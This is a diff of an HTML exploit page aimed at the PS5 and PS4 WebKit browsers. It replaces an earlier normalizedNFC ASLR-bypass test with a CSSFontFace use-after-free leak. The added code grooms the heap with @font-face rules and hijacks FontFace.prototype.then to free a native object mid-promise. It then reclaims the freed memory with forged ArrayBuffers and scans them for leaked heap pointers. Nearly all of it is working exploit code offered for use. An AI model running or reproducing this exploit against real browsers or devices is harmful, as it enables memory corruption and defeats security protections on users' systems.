@@ -2,82 +2,201 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 ASLR Bypass - normalizedNFC via TextEncoding</title>
+<title>CSSFontFace Non-Vtable Pointer Leak (Stable ntfargo Implementation)</title>
+<style>
+body { background:#0a0a0a; color:#0f0; font-family:'Courier New',monospace; font-size:13px; padding:16px; margin:0; }
+h1 { color:#0ff; font-size:18px; border-bottom:1px solid #333; padding-bottom:8px; margin-top:0; }
+.panel { display:flex; flex-wrap:wrap; gap:10px; margin-bottom:16px; }
+button { background:#1e1e2e; color:#0ff; border:1px solid #0ff; padding:10px 16px; font-family:inherit; font-weight:bold; cursor:pointer; border-radius:4px; font-size:14px; }
+button:hover { background:#0ff; color:#000; }
+button.leak { border-color:#0f0; color:#0f0; }
+button.leak:hover { background:#0f0; color:#000; }
+#log { background:#111; border:1px solid #222; padding:12px; height:450px; overflow-y:auto; border-radius:4px; }
+.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; } .pass { color:#0f0; } .fail { color:#f00; }
+.leak-msg { color:#0ff; font-weight:bold; font-size:15px; background:#003333; padding:8px; border:2px solid #0ff; margin:8px 0; }
+</style>
+<style id="css_font_style"></style>
 </head>
 <body>
-<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
+
+<h1>CSSFontFace Non-Vtable Pointer Leak (Stable ntfargo Implementation)</h1>
+
+<div class="panel">
+    <button onclick="runStableCSSFontFaceLeak(296)" class="leak">Run 296B Bucket (PS5 Target)</button>
+    <button onclick="runStableCSSFontFaceLeak(288)" class="leak">Run 288B Bucket (PS4 Target)</button>
+    <button onclick="runStableCSSFontFaceLeak(232)" class="leak">Run 232B Bucket</button>
+    <button onclick="clearLog()">Clear Console</button>
+</div>
+
+<div id="log"></div>
+
 <script>
-const L = s => { document.getElementById('log').textContent += s + '\n'; };
-
-L('[*] Starting WTF::normalizedNFC leak test...');
-
-// The bug: WTF::normalizedNFC allocates an uninitialized StringImpl
-// and trusts ICU to fill it. If ICU underwrites, the tail contains heap pointers.
-//
-// We trigger this by encoding strings that require NFC normalization.
-// TextEncoder.encodeInto() or even setting document.charset might trigger this.
-
-// Groom heap with 0x41414141
-let spray = [];
-for (let i = 0; i < 100000; i++) {
-    spray.push("AAAAAAAAAAAAAAAAAAAA");
+function log(m, c) {
+    var d = document.createElement("div");
+    d.className = c || '';
+    d.textContent = "[" + new Date().toLocaleTimeString() + "] " + m;
+    var l = document.getElementById("log");
+    l.appendChild(d);
+    l.scrollTop = l.scrollHeight;
 }
-spray = null;
 
-// Test 1: TextEncoder with combining characters
-L('\n--- Test 1: TextEncoder ---');
-try {
-    const encoder = new TextEncoder();
-    // Strings with combining marks that require NFC normalization
-    const testStrings = [
-        'e\u0301', // é (NFC should compose to single char)
-        'a\u0308\u0304', // ǟ
-        '\u2126', // Ω (Ohm sign -> Greek Omega)
-        'e\u0301'.repeat(100),
-    ];
-    
-    for (const str of testStrings) {
-        const bytes = encoder.encode(str);
-        L('[+] Encoded: ' + bytes.length + ' bytes');
+function clearLog() {
+    document.getElementById("log").innerHTML = "";
+    log("Console cleared.", "info");
+}
+
+function hex(low, high) {
+    var hiStr = high.toString(16).padStart(8, '0');
+    var loStr = low.toString(16).padStart(8, '0');
+    return "0x" + hiStr + loStr;
+}
+
+function isValidHeapPtr(low, high) {
+    if (high >= 0x00000001 && high <= 0x00007fff) {
+        if (low !== 0x00000000 && low !== 0x41414141 && low !== 0x46464646 && low !== 0x47474747) {
+            return true;
+        }
     }
-} catch(e) {
-    L('[!] TextEncoder error: ' + e.message);
+    return false;
 }
 
-// Test 2: TextDecoder (decoding might also trigger normalization)
-L('\n--- Test 2: TextDecoder ---');
-try {
-    const decoder = new TextDecoder('utf-8');
-    // Create bytes that represent decomposed characters
-    const bytes = new Uint8Array([0x65, 0xCC, 0x81]); // e + combining acute
-    const result = decoder.decode(bytes);
-    L('[+] Decoded: ' + result + ' (length: ' + result.length + ')');
-} catch(e) {
-    L('[!] TextDecoder error: ' + e.message);
-}
+log("CSSFontFace Stable Pointer Leak Suite Ready.", "info");
 
-// Test 3: Font rendering with combining characters
-// This triggers FontCascade::fontForCombiningCharacterSequence -> normalizedNFC
-L('\n--- Test 3: Font Rendering ---');
-try {
-    const div = document.createElement('div');
-    div.style.fontFamily = 'sans-serif';
-    div.textContent = 'e\u0301a\u0308\u0304\u2126';
-    document.body.appendChild(div);
-    // Force layout
-    void div.offsetWidth;
-    L('[+] Font rendering triggered');
+async function runStableCSSFontFaceLeak(targetSize) {
+    log("=== EXECUTING STABLE CSSFontFace LEAK (Bucket Size: " + targetSize + "B) ===", "warn");
     
-    // Check the rendered text
-    const range = document.createRange();
-    range.selectNodeContents(div);
-    const text = range.toString();
-    L('[+] Rendered text: ' + text);
-} catch(e) {
-    L('[!] Font rendering error: ' + e.message);
+    const spray_count = 0xb0;
+    const spray_font_rule = `@font-face { font-family: spray; src: local(Helvetica); unicode-range: U+0043; }`;
+    const uaf_font_rule = `@font-face { font-family: b; src: url(nonexistent-font.woff); unicode-range: U+0042; }`;
+    
+    // Pre-allocate array of exact length like ntfargo
+    const abs = new Array(spray_count);
+    
+    const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });
+    document.fonts.add(A);
+    void A.loaded;
+    
+    let style = document.getElementById("css_font_style");
+    style.innerHTML = "";
+    let sheet = style.sheet || style.styleSheet;
+    
+    // Shape heap
+    for (let i = 0; i < spray_count / 4; i++) {
+        sheet.insertRule(spray_font_rule, sheet.cssRules.length);
+    }
+    
+    const uaf_rule_index = sheet.cssRules.length;
+    sheet.insertRule(uaf_font_rule, sheet.cssRules.length);
+    
+    for (let i = spray_count / 4; i < spray_count; i++) {
+        sheet.insertRule(spray_font_rule, sheet.cssRules.length);
+    }
+    
+    document.body.offsetTop;
+    
+    const old_then = FontFace.prototype.then;
+    
+    Object.defineProperty(FontFace.prototype, "then", {
+        configurable: true,
+        get() {
+            if (this === A) {
+                log("[!] FontFace A thenable GETTER FIRED during promise resolution!", "warn");
+                log("[!] Deleting rule 'b' to free native CSSFontFace...", "hit");
+                
+                sheet.deleteRule(uaf_rule_index);
+                document.body.offsetTop;
+                
+                log("[!] Deleting neighbor spray rules...", "info");
+                for (let i = sheet.cssRules.length - 1; i >= 0; i--) {
+                    if (sheet.cssRules[i].cssText.includes("spray")) {
+                        sheet.deleteRule(i);
+                    }
+                }
+                document.body.offsetTop;
+                
+                log("[!] Spraying ArrayBuffer(" + targetSize + ") with m_status = Status::Success (3)...", "hit");
+                
+                // Determine m_status offset based on target size
+                let statusOffset = 0x120;
+                if (targetSize === 288) statusOffset = 0x118;
+                if (targetSize === 232) statusOffset = 0x9a;
+                if (targetSize === 184) statusOffset = 0x82;
+                
+                for (let i = 0; i < abs.length; i++) {
+                    let ab = new ArrayBuffer(targetSize);
+                    let view = new DataView(ab);
+                    view.setUint32(8, 1, true); // refCount = 1
+                    if (statusOffset < targetSize) {
+                        view.setUint8(statusOffset, 3, true); // Status::Success
+                    }
+                    abs[i] = ab;
+                }
+                log("[*] Reclaim complete (" + abs.length + " buffers). Returning to FontFaceSet::load...", "warn");
+            }
+            return undefined;
+        }
+    });
+    
+    log("[*] Executing await document.fonts.load('1em a, b', 'AB')...", "info");
+    try {
+        let loadedFonts = await document.fonts.load("1em a, b", "AB");
+        log("[+] SUCCESS! document.fonts.load resolved cleanly without crash!", "hit");
+        
+        let uaf_font = undefined;
+        for (let font of loadedFonts) {
+            if (font.unicodeRange === "U+0-10FFFF") {
+                log(">>> FOUND ALIASED UAF FONTFACE OBJECT! <<<", "hit");
+                uaf_font = font;
+                break;
+            }
+        }
+        
+        // Scan abs for refcount === 2
+        let uaf_ab = undefined;
+        for (let i = 0; i < abs.length; i++) {
+            let view = new DataView(abs[i]);
+            let refCount = view.getUint32(8, true);
+            if (refCount === 2) {
+                log(">>> SUCCESS! IDENTIFIED RECLAIMED ARRAYBUFFER AT INDEX #" + i + " (RefCount == 2)! <<<", "leak-msg");
+                uaf_ab = abs[i];
+                break;
+            }
+        }
+        
+        if (uaf_ab) {
+            let uaf_view = new DataView(uaf_ab);
+            log("[*] Full-spectrum scanning reclaimed " + targetSize + "B ArrayBuffer for C++ pointers...", "info");
+            
+            for (let off = 0x10; off < targetSize - 8; off += 8) {
+                let lo = uaf_view.getUint32(off, true);
+                let hi = uaf_view.getUint32(off + 4, true);
+                if (isValidHeapPtr(lo, hi)) {
+                    log(">>> POINTER LEAK DISCOVERED at offset +0x" + off.toString(16) + ": " + hex(lo, hi) + " <<<", "leak-msg");
+                }
+            }
+        } else {
+            log("[-] RefCount did not increment to 2. Scanning all buffers for non-zero heap pointers...", "info");
+            for (let i = 0; i < abs.length; i++) {
+                let view = new DataView(abs[i]);
+                for (let off = 0x10; off < targetSize - 8; off += 8) {
+                    let lo = view.getUint32(off, true);
+                    let hi = view.getUint32(off + 4, true);
+                    if (isValidHeapPtr(lo, hi)) {
+                        log(">>> FOUND LEAKED POINTER IN BUFFER #" + i + " at +0x" + off.toString(16) + ": " + hex(lo, hi) + " <<<", "leak-msg");
+                        break;
+                    }
+                }
+            }
+        }
+        
+    } catch(e) {
+        log("[-] document.fonts.load rejected: " + e.message, "fail");
+    } finally {
+        Object.defineProperty(FontFace.prototype, "then", { configurable: true, value: old_then });
+    }
 }
-
-L('\n[*] Test finished.');
 </script>
+
 </body>
 </html>
+
